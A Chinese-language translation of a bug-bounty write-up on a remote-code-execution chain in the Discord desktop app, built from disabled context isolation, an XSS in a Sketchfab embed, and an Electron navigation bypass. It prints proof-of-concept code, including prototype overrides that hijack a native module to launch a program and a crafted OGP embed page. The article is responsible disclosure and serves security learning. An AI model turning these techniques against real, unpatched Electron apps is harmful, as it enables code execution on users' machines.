\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzA5ODA0NDE2MA==&mid=2649733751&idx=3&sn=1bb585c9ed5d41b6c0535c7bc3a56c49&chksm=888c8a18bffb030ed00e77f9a1425c40b67e56aa51735cc9f5827e59cf9cdc631c6e5835b0e1&mpshare=1&scene=1&srcid=10289kLj3o21QB4ec27gfRVZ&sharer\_sharetime=1603882958784&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=d1b2c53fcb9e77ee616432c315469a95bdc9ed91c97b8c6511d31a2a44ea5edc80abbcd613d3cfda0ea0360dbf2582fb579acd946d26a00a03075b9e12aa9b6b70dab57a2deae3f8aa0c9c9550b98d9fd7a1e26c3cceeef9c87d30566f874bb70a1086ee7449241a8bc3a2edd1976973e4302c7b418e68a2d268754ff6a0f453&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AdZBmzKRneHJXWmKo5lGMK4%3D&pass\_ticket=XqanHwJmjJ0Tdk%2BrPOdb72YYtpZjyKrL7crfEBca6UpzsRYBedqq7VDwWAi4OjhS&wx\_header=0)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb7bCXibnUyfIrCp5jjsVDDRy9zpU0Xnpbg5RMRo81oKRaYAMKq5gSmKMamehJtfwXLWJSjQgDYyAsA/640?wx_fmt=jpeg)

**Discord 桌面应用 RCE 漏洞**
-----------------------

几个月之前，我挖掘出了 Discord 的一个 RCE 漏洞，并向他们的 src 报告了这个漏洞。

这次我找到的 RCE 漏洞比较有趣，因为这个漏洞是通过组合多个漏洞实现的。在本文中，我会分享该漏洞的挖掘细节。

注：Discord 是一款专为社区设计的免费网络实时通话软件与数字发行平台，主要面向游戏玩家、教育人士及商业人士，用户之间可以在软体的聊天频道通过信息、图片、视频和音频进行互动。

**为什么我选择 Discord 作为我的目标**
-------------------------

一直以来，我对寻找基于 Electron 框架开发的应用程序（以下简称为 Electron 应用）的漏洞非常感兴趣。因此我会寻找有漏洞挖掘奖励计划的 Electron 应用作为我的目标，而这次我找到了 Discord。另外，我也是 Discord 的用户，我也想检查一下这个应用程序是不是安全的。

注：Electron（原名为 Atom Shell）是 GitHub 开发的一个开源软件框架。它允许使用 Node.js（作为后端）和 Chromium（作为前端）完成桌面 GUI 应用程序的开发

**我找到的漏洞**
----------

我这次一个发现了三个漏洞，并将他们组合在一起达成了一个 RCE 漏洞

1.  contextisolation 默认关闭缺陷
    
2.  iframe embeds 中的 XSS 漏洞
    
3.  功能禁用限制的绕过 (CVE-2020-15174)
    

我将会一一解释这三个漏洞。

**漏洞一：contextisolation 默认关闭缺陷**
-------------------------------

当我对 Electron 应用进行测试时，我总会在第一时间检查 BrowserWindow API 的选项值，这个 API 用于创建和控制浏览器窗口。通过检查它的选项值，我可以判断在我拥有 renderer 上任意 JS 代码执行能力的情况下，能不能达成 RCE 利用条件。

Discord 的 Electron 应用并不是开源项目，但是 Electron 的 JS 代码会以 asar 格式保存在本地，因此我可以提取并阅读它。

在主窗口中，它的选项值如下所示

```
const mainWindowOptions = {
  title: 'Discord',
  backgroundColor: getBackgroundColor(),
  width: DEFAULT\_WIDTH,
  height: DEFAULT\_HEIGHT,
  minWidth: MIN\_WIDTH,
  minHeight: MIN\_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
    nodeIntegration: false,
    preload: \_path2.default.join(\_\_dirname, 'mainScreenPreload.js'),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true
  }
};
```

值得关注的值是 nodeIntegration 和 contextIsolation。从上面的代码看来，我们可以发现 nodeIntegration 选项的值为 false，以及 contextIsolation 的值也被设置为 false(默认值)。  

如果 nodeIntegration 被设置为 true，一个 web 页面的 js 可以通过调用 require() 轻松使用 Node.js 的特性。举个例子，通过下面的代码来弹出 windows 计算器

```
<script>
  require('child\_process').exec('calc');
</script>
```

我们的目标启用了 nodeIntegration，因此我们不能直接调用 require() 来使用 Node.js 的特性。  

不过，我们仍然可以通过其他方法来使用 Node.js 的特性。显然，contextIsolation 是一个关键的选项，它被设置为 false。实际上，如果你想要消除你的 app 出现 RCE 漏洞的可能性，你就不应该设置该值为 false。

在 contextIsolation 值设置为 false 的时候，一个普通 web 页面上的 js 代码可以通过 preload 的方式 (预加载) 影响到 Electron 内部 renderer 上的 js 代码执行。举个例子，如果你在一个 web 页面的 js 代码中重写了`Array.prototype.join`，这是一个 js 内置函数。当不在这个 web 页面内的 js 代码需要调用`join`时，实际上调用的时被重写后的函数。

这种特性是比较危险的，因为使得 Electron 可以通过重写函数的方法，在忽略 nodeIntegration 的情况下允许外部的 js 代码应用 Node.js 的特性。这使得 RCE 有可能在 nodeIntegration 被设置为 false 的情况下实现利用。

contextIsolation 引入了上下文分离的特性，web 页面的 js 代码和页面外的 js 代码之间是相互隔离的，代码执行效果不会互相影响。这个特性能够有效降低出现 RCE 漏洞的可能性，但这一次的 Discor 上被禁用了。

因为我发现 contextIsolation 被禁用了，因此我开始寻找一个可以通过影响 web 页面外的 js 来执行任意代码的地方。

通常，我在尝试编写 Electron 应用 RCE 的 POC 时，我首先会尝试使用 Electron 在 renderer 上的内部 js 代码来实现 RCE。因为 Electron 在 renderer 内部的 js 代码可以在任意 Electron 应用上执行。  
因此我只需要简单的重用一下之前编写过的 RCE 即可。

然而，在当前版本的 Electron 中，或者说在当前配置下，之前的 POC 没有办法成功运行。因此，这次我决定换一个地方来 preload 我们的攻击脚本。

我在尝试 proload 脚本时，我发现 Discord 暴露一个关键的函数，`DiscordNative.nativeModules.requireModule('MODULE-NAME')`，这个函数使得我们引入模块到 web 页面中。

在这里，我不能直接引入能够直接触发 RCE 的模块，比如`child_process`模块，但我发现通过重载 js 内置模块可以影响到引入模块的运行，从而达成 RCE。

下面是 PoC。`getGPUDriverVersion`函数在 devTools 中的模块`discord_utils`被定义，当 PoC 调用`getGPUDriverVersions`时, 我们发现 windows 计算器成功被弹出。显然，我们通过`RegExp.prototype`和`Array.prototype.join`成功重载函数。

```
RegExp.prototype.test=function(){
    return false;
}
Array.prototype.join=function(){
    return "calc";
}
DiscordNative.nativeModules.requireModule('discord\_utils').getGPUDriverVersions();
```

`getGPUDriverVersions`函数尝试使用`execa`库运行某个程序时，如下所示

```
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== 'win32') {
    return {};
  }

  const result = {};
  const nvidiaSmiPath = \`${process.env\['ProgramW6432'\]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe\`;

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, \[\]));
  } catch (e) {
    result.nvidia = {error: e.toString()};
  }

  return result;
};
```

从上面的代码看来，通常`execa`尝试运行应用程序”nvidia-smi.exe”，也就是`nvidiaSmipath`的值。但是，通过我们上面所说的重载`RegExp.prototype.test`和`Array.prototype.join`, 将`nvidiaSmiPath`替换成`calc`，最终成功弹出计算器。  

**漏洞二：iframe embeds 中的 XSS 漏洞**
-------------------------------

如上所述，我发现任意的 JS 代码执行都可能发生 RCE，因此我试图找到一个 XSS 漏洞。在信息收集阶段，我发现该应用程序支持自动链接或 Markdown 特性。所以我把注意力转向 iframe 嵌入功能。例如，当 YouTube URL 被发布时，iframe 嵌入的特性会自动在聊天中显示视频播放器。

但是，Discord 会对你放入的 URL 进行校验，获取 URL 的 OGP 信息，只有当 OGP 信息符合要求时，Discord 才会展示相关内容。

简单来说，这里的检验属于白名单校验，我们来观察以下能够通过检查的 URL

```
Content-Security-Policy: \[...\] ; frame-src https://\*.youtube.com https://\*.twitch.tv https://open.spotify.com https://w.soundcloud.com https://sketchfab.com https://player.vimeo.com https://www.funimation.com https://twitter.com https://www.google.com/recaptcha/ https://recaptcha.net/recaptcha/ https://js.stripe.com https://assets.braintreegateway.com https://checkout.paypal.com https://\*.watchanimeattheoffice.com
```

显然，其中一些列表允许 iframe 嵌入 (如 YouTube, Twitch, Spotify)。我尝试通过在 OGP 信息中一个一个地指定域来检查 URL 是否可以嵌入到 iframe 中，并尝试在嵌入的域中找到 XSS。经过一些尝试，我发现了 sketchfab.com，它是 CSP 中列出的一个域，可以嵌入到 iframe 中，我在嵌入页面上找到 XSS。我当时还不了解 Sketchfab 网站，它看起来是一个用户可以发布、购买和销售 3D 模型的平台。  

下面是 PoC，它具有精心设计的 OGP。当我将这个 URL 发布到聊天框时，Sketchfab 被嵌入到聊天中的 iframe 中，在 iframe 上单击几次后，就会执行任意的 JS 代码

```
<head>
    <meta charset="utf-8">
    <meta property="og:title" content="RCE DEMO">
    \[...\]
    <meta property="og:video:url" content="https://sketchfab.com/models/2b198209466d43328169d2d14a4392bb/embed">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="1280">
    <meta property="og:video:height" content="720">
</head>
```

最后我又找到了一个 XSS，但是 JavaScript 仍然在 iframe 上执行。由于 Electron 不会将 “web 页面外部的 JavaScript 代码” 加载到 iframe 中，因此即使我覆盖了 iframe 上的 JavaScript 内置方法，我也不能影响 Node.js 的关键部分。要实现 RCE，我们需要跳出 iframe，在顶层上下文中执行 JavaScript。这需要从 iframe 打开一个新窗口，或者从 iframe 导航顶部窗口到另一个 URL。  

我查看了相关代码，发现主进程代码中使用 “new-window” 和“will- navigation”事件限制导航的代码:

```
mainWindow.webContents.on('new-window', (e, windowURL, frameName, disposition, options) => {
  e.preventDefault();
  if (frameName.startsWith(DISCORD\_NAMESPACE) && windowURL.startsWith(WEBAPP\_ENDPOINT)) {
    popoutWindows.openOrFocusWindow(e, windowURL, frameName, options);
  } else {
    \_electron.shell.openExternal(windowURL);
  }
});
\[...\]
mainWindow.webContents.on('will-navigate', (evt, url) => {
  if (!insideAuthFlow && !url.startsWith(WEBAPP\_ENDPOINT)) {
    evt.preventDefault();
  }
});
```

我本来以为这段代码把我寻找 RCE 的路封死了，它看起来毫无破绽，但是在测试的过程中我发现了有意思的东西。  

**漏洞三：功能禁用限制的绕过 (CVE-2020-15174)**
----------------------------------

我认为代码写的没什么问题，但在我检查顶部导航在 iframe 中是否会被阻塞时，我却惊奇地发现，因为某些原因，导航并没有被阻塞。从代码来看，在导航发生之前，”will-navigation” 事件应该会尝试捕获它，并被`preventDefault()`拒绝，但实际上没有。

我创建了一个小型 Electron 应用程序用来测试这个发现。我发现，由于某种原因，”will- navigation” 事件没有从 iframe 开始的顶部导航中发出。确切地说，如果 top 的域和 iframe 的域在同一个域，事件就会被发出，但是如果它在不同的域，事件就不会被发出。我认为这应该是 Electron 的 bug，并决定稍后向 Electron 报告。

在这个 bug 的帮助下，我最终成功绕过导航限制。我最后需要做的就是使用 iframe 的 XSS 漏洞导航到一个含有 RCE 代码的页面即可，比如说 top.location=”//l0.cm/discord\_calc.html”

最终，结合三个漏洞，我成功实现了 RCE，下面是视频演示。

https://youtu.be/0f3RrvC-zGI  
（点击 “阅读原文” 查看链接）

**总结**
------

我向 Discord 的 src 报告了漏洞。最终 RCE 漏洞获得 5000 美元的奖励，Sketchfab 的 XSS 漏洞获得了 300 美元奖励。第三个漏洞”will-navigate” 事件不能正常发出获得了一个 CVE 编号 (CVE-2020-15174)。

**参考**
------

https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en

（点击 “阅读原文” 查看链接）

**译文声明**  

译文仅供参考，具体内容表达以及含义原文为准。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)

**戳 “阅读原文” 查看更多内容**